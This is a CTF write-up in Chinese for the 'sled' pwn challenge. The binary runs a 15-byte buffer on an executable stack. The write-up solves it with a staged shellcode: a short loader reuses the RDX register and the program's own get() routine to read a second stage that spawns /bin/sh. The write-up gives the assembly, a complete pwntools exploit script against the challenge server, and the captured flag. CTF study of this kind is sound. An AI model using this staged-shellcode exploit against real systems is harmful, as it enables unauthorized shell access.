# sled

## 题目简述

程序把全局指针 `buf` 指向栈上的 16 字节数组，先调用 `get(0x10)` 读取最多 15 字节，然后直接把 `buf` 当函数执行。编译参数包含 `-z execstack`，因此栈可执行。难点是第一阶段空间不足以放下完整 `/bin/sh` shellcode，需要用短 loader 再次调用程序已有的 `get` 读取第二阶段。

## 解题过程

第一次间接调用前，编译器把 `buf` 地址装入 `RDX` 再执行 `call rdx`，所以进入第一阶段时 `RDX` 仍指向栈缓冲区。构造 12 字节左右的 stage 1：

```asm
mov edi, 0x100
push rdx
push get
ret
```

`get` 的第一个参数使用 `EDI`，因此它会执行 `fgets(buf, 0x100, stdin)`，把更长的第二阶段覆盖到同一个可执行缓冲区。`push rdx` 为这次通过 `ret` 进入的 `get` 准备返回地址；读取结束后，`get` 返回到已经被第二阶段覆盖的 `buf`。

```python
from pwn import *

elf = context.binary = ELF("./out", checksec=False)

stage1 = asm("mov edi, 0x100")
stage1 += asm("push rdx")
stage1 += asm(f"push {elf.sym['get']}")
stage1 += asm("ret")
assert len(stage1) <= 15

io = remote("tjc.tf", 31456)
io.sendline(stage1)
io.sendline(asm(shellcraft.sh()))
io.sendline(b"cat flag.txt")
print(io.recvline().decode())
```

第二阶段启动 shell 后读取到：

```text
tjctf{bby-shhEellLcodeeeeeaf7af7f66}
```

## 方法总结

- 15 字节限制适合 staged shellcode：第一阶段只负责扩大读取，第二阶段再承担实际功能。
- 利用寄存器残值前必须从调用点反汇编确认；本题依赖 `RDX` 在间接调用时保存 `buf`，不是通用 ABI 保证。
- `push address; ret` 可以在字节数紧张时替代较长的绝对跳转/调用，同时顺手布置被调函数的返回地址。
